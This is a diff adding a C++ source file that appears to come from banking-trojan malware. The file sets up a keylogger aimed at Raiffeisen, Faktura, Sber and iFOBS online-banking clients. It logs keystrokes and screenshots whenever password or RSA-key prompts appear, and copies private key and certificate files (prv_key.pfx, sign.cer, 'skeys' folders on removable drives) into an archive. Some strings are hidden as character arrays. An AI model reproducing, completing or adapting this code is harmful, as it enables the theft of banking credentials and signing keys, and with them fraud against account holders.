@@ -1,0 +1,197 @@
+// ---------------------------------------------------------------------------
+#include <windows.h>
+
+#include "GetApi.h"
+#include "KeyLogSystems.h"
+#include "Memory.h"
+#include "Utils.h"
+
+#include "Modules.h"
+
+
+#ifdef SBERH
+	#include "SberKeyLogger.h"
+#endif
+
+// ---------------------------------------------------------------------------
+namespace Rafa {
+
+	void AddFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel) {
+		// Добавляем директорию в архив кейлогера
+		KeyLogger::AddDirectory(FileName, Search->cFileName);
+
+		Cancel = true;
+		*(bool*)Data = true;
+	}
+
+	void SearchRafaFiles(PCHAR Drive, LPVOID Data, bool &Cancel) {
+		char D = *Drive;
+		if (D == 'a' || D == 'A' || D == 'b' || D == 'B')
+			return;
+
+		bool C = false;
+		SearchFiles(Drive, "skeys*", false, FA_DIRECTORY, &C, AddFiles);
+		Cancel = C;
+	}
+
+	void CopyRafaKeyFiles(LPVOID Sender) {
+		// Функция обработчик инициализации системы rafa
+		// Добавляет в архив кейлогера файлы ключей
+		EnumDrives(DRIVE_REMOVABLE, SearchRafaFiles, NULL);
+
+	}
+}
+
+// ---------------------------------------------------------------------------
+void FakturaInitialize(LPVOID Sender) {
+	// Метод инициализации фактуры
+
+	// При инициализации фактуры копируем два файла в архив кейлогера
+	const static char FukturaKey[] = {
+		'S', 'o', 'f', 't', 'w', 'a', 'r', 'e', '\\', 'F', 'T', 'C', '\\', 'S',
+		'K', 'S', 'B', '\\', 'K', 'e', 'y', 'S', 't', 'o', 'r', 'a', 'g', 'e', 0
+	};
+	const static char File1[] = {
+		'p', 'r', 'v', '_', 'k', 'e', 'y', '.', 'p', 'f', 'x', 0
+	};
+	const static char File2[] = {
+		's', 'i', 'g', 'n', '.', 'c', 'e', 'r', 0
+	};
+	const static char InternalPath[] = {
+		'K', 'e', 'y', 's', '\\', 0
+	};
+
+	// Первым делом проверяем ветку реестра в которой фактура прописывает
+	// свои ключи
+	bool FreePath = true;
+	PCHAR Path = Registry::GetStringValue(HKEY_CURRENT_USER, (PCHAR)FukturaKey,
+		NULL);
+
+	// Если в реестре нет пути, то устанавливаем путь по умолчанию
+	if (Path == NULL) {
+		FreePath = false;
+		Path = "A:\\";
+	}
+
+	// Определяем обратный слэш
+	PCHAR Slash = NULL;
+	PCHAR End = STR::End(Path);
+	End--;
+	if (*End != '\\')
+		Slash = "\\";
+
+	PCHAR F1 = STR::New(3, Path, Slash, (PCHAR)File1);
+	PCHAR F2 = STR::New(3, Path, Slash, (PCHAR)File2);
+
+	PCHAR IntF1 = STR::New(2, (PCHAR)InternalPath, (PCHAR)File1);
+	PCHAR IntF2 = STR::New(2, (PCHAR)InternalPath, (PCHAR)File2);
+
+	KeyLogger::AddFile(F1, IntF1, NULL, 0);
+	KeyLogger::AddFile(F1, IntF2, NULL, 0);
+
+	if (FreePath)
+		STR::Free(Path);
+
+	STR::Free(F1);
+	STR::Free(F2);
+	STR::Free(IntF1);
+	STR::Free(IntF2);
+}
+
+
+// ---------------------------------------------------------------------------
+
+
+void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data)
+{
+	// Функция регистрирует заранее известные системы кейлогера
+
+    PKeyLogSystem S;
+
+	// Добавляем систему raif
+	S = KeyLogger::AddSystem("raif", PROCESS_HASH_IE);
+	if (S != NULL)
+	{
+		char RafaCaption[] = {
+			'В', 'в', 'е', 'д', 'и', 'т', 'е', ' ', 'п', 'а', 'р', 'о', 'л', 'ь', 0 };
+
+		S->OnActivate = Rafa::CopyRafaKeyFiles;
+		KeyLogger::AddFilter(S, NULL, (PCHAR)RafaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
+    }
+
+
+	// Добавляем систему фактура
+	S = KeyLogger::AddSystem("faktura", PROCESS_HASH_IE);
+	if (S != NULL)
+	{
+		char FacturaCaption[] = {
+			'П', 'р', 'о', 'в', 'е', 'р', 'к', 'а', ' ', 'п', 'а', 'р', 'о', 'л',
+			'я', ' ', '(', 'к', 'л', 'ю', 'ч', ' ', 'R', 'S', 'A', ')', 0 };
+
+		S->OnActivate = FakturaInitialize;
+
+		KeyLogger::AddFilter(S, NULL, FacturaCaption, FILTRATE_PARENT_WND, LOG_ALL, 3);
+	}
+
+
+	// Добавляем QWidjet
+	S = KeyLogger::AddSystem("qwidget", PROCESS_HASH_IE);
+	if (S != NULL)
+	{
+		char QWidgetClass[] = {'q', 'w', 'i', 'd', 'g', 'e', 't', 0};
+		KeyLogger::AddFilter(S, QWidgetClass, NULL, FILTRATE_PARENT_WND, LOG_ALL, 3);
+    }
+
+
+
+	// Регистрируем систему для сбер
+	#ifdef SberKeyLoggerH
+    	RegisterSberKeyLogger();
+	#endif
+
+    // Добавляем систему IFOBS
+	S = KeyLogger::AddSystem("ifobs", PROCESS_HASH_IE);
+	if (S != NULL)
+	{
+		char JavaFrameClass[] = {'S', 'u', 'n', 'A', 'w', 't', 'F', 'r', 'a', 'm', 'e',  0};
+		KeyLogger::AddFilter(S, JavaFrameClass, NULL, FILTRATE_PARENT_WND, LOG_ALL, 4);
+    }
+
+
+	#ifdef TEST_APP
+		KeyLogger::AddSystem("No_Filters", 0x5E1DF91B /* agentfulltest.exe */);
+
+
+		S = KeyLogger::AddSystem("Test_APP", 0);
+		if (S != NULL)
+		{
+			char Caption[] = {'В', 'в', 'е', 'д', 'и', 'т', 'е', ' ', 'п', 'а', 'р', 'о', 'л', 'ь',  0};
+			char Caption2[] = {'В', 'в', 'е', 'д', 'и', 'т', 'е', ' ', 'к', 'л', 'ю', 'ч',  0};
+			KeyLogger::AddFilter(S, NULL, Caption, FILTRATE_PARENT_WND, LOG_KEYBOARD, 3);
+			KeyLogger::AddFilter(S, NULL, Caption2, FILTRATE_PARENT_WND, LOG_KEYBOARD, 3);
+		}
+	#endif
+
+
+}
+
+
+//-------------------------------------------------------------
+void StartKeyLogger(PCHAR AppName)
+{
+	//  Функция регистрирует заранее известные
+	//	системы кейлогера и запускает его
+
+   	KeyLogger::Initialize(AppName);
+
+	TKeyLoggerFilterData Data;
+	ClearStruct(Data);
+
+	Data.SSWidth = 40;
+	Data.SSHeight = 40;
+
+    RegisterAllKeyLoggerSystem(&Data);
+
+
+    KeyLogger::Start();
+}
